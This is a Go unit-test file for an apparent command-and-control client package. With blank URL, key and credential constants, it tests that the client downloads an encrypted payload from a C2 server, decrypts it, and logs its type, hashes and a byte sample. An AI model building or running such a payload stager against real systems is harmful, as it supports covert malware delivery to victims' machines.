package c2

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"testing"
)

// Global test constants for easy modification
var (
	// Connection URL
	testURL = ""
	// Test key as byte slice: 000102130405f60708090a0b0c0d0e0f
	testKey = []byte{}
	// Authentication credentials
	testUsername = ""
	testPassword = ""
)

func TestC2Authentication(t *testing.T) {
	// Create C2 client with all options including authentication
	c2 := New(
		WithURL(testURL),
		WithKey(testKey),
		WithUsername(testUsername),
		WithPassword(testPassword),
	)

	// Verify all options were set correctly
	if c2.URL != testURL {
		t.Errorf("Expected URL to be %s, got %s", testURL, c2.URL)
	}

	if len(c2.Key) != len(testKey) {
		t.Errorf("Expected Key length to be %d, got %d", len(testKey), len(c2.Key))
	}

	for i, b := range testKey {
		if c2.Key[i] != b {
			t.Errorf("Expected Key[%d] to be %d, got %d", i, b, c2.Key[i])
		}
	}

	if c2.Username != testUsername {
		t.Errorf("Expected Username to be %s, got %s", testUsername, c2.Username)
	}

	if c2.Password != testPassword {
		t.Errorf("Expected Password to be %s, got %s", testPassword, c2.Password)
	}
}

func TestC2DownloadWithAuth(t *testing.T) {
	// Create C2 client with all options
	c2 := New(
		WithURL(testURL),
		WithKey(testKey),
		WithUsername(testUsername),
		WithPassword(testPassword),
	)

	// Test download functionality (this will make an actual HTTP request)
	// Note: This test requires the server to be running at the specified URL
	payload, err := c2.downloadPayload()
	if err != nil {
		t.Fatalf("Failed to download payload: %v", err)
	}

	// Verify payload is not empty
	if len(payload) == 0 {
		t.Error("Expected non-empty payload, got empty")
	}

	// Calculate and log MD5 hash of encrypted payload
	encryptedHash := md5.Sum(payload)
	encryptedHashStr := hex.EncodeToString(encryptedHash[:])
	t.Logf("Encrypted payload MD5: %s", encryptedHashStr)
	t.Logf("Encrypted payload length: %d bytes", len(payload))

	// Test decryption
	decryptedPayload, err := c2.decryptPayload(payload)
	if err != nil {
		t.Fatalf("Failed to decrypt payload: %v", err)
	}

	// Verify decrypted payload is not empty
	if len(decryptedPayload) == 0 {
		t.Error("Expected non-empty decrypted payload, got empty")
	}

	// Split decrypted payload into type (first line) and actual payload (remaining)
	var typePart, actualPayloadPart []byte
	if newlineIndex := bytes.Index(decryptedPayload, []byte{'\n'}); newlineIndex != -1 {
		typePart = decryptedPayload[:newlineIndex]
		actualPayloadPart = decryptedPayload[newlineIndex+1:]
	} else {
		// If no newline found, treat entire payload as type (edge case)
		typePart = decryptedPayload
		actualPayloadPart = []byte{}
	}

	// Calculate and log MD5 hash of type part
	typeHash := md5.Sum(typePart)
	typeHashStr := hex.EncodeToString(typeHash[:])
	t.Logf("Payload Type: %s", string(typePart))
	t.Logf("Payload Type MD5: %s", typeHashStr)

	// Calculate and log MD5 hash of actual payload part
	actualPayloadHash := md5.Sum(actualPayloadPart)
	actualPayloadHashStr := hex.EncodeToString(actualPayloadHash[:])
	t.Logf("Actual Payload Length: %d bytes", len(actualPayloadPart))
	t.Logf("Actual Payload MD5: %s", actualPayloadHashStr)

	// Log a sample of the decrypted payload (first 100 bytes if available)
	if len(decryptedPayload) > 0 {
		maxSample := 100
		if len(decryptedPayload) < maxSample {
			maxSample = len(decryptedPayload)
		}
		t.Logf("Decrypted payload sample (first %d bytes): %q", maxSample, string(decryptedPayload[:maxSample]))
	}
}

func TestMD5Calculation(t *testing.T) {
	// Test MD5 calculation functionality with sample data
	sampleData := []byte("test payload data for MD5 calculation")

	// Calculate MD5
	hash := md5.Sum(sampleData)
	hashStr := hex.EncodeToString(hash[:])

	// Log the actual hash (useful for debugging)
	t.Logf("Sample data MD5: %s", hashStr)

	// This test just verifies that MD5 calculation doesn't panic
	// and produces a valid 32-character hex string
	if len(hashStr) != 32 {
		t.Errorf("Expected MD5 hash to be 32 characters long, got %d", len(hashStr))
	}
}
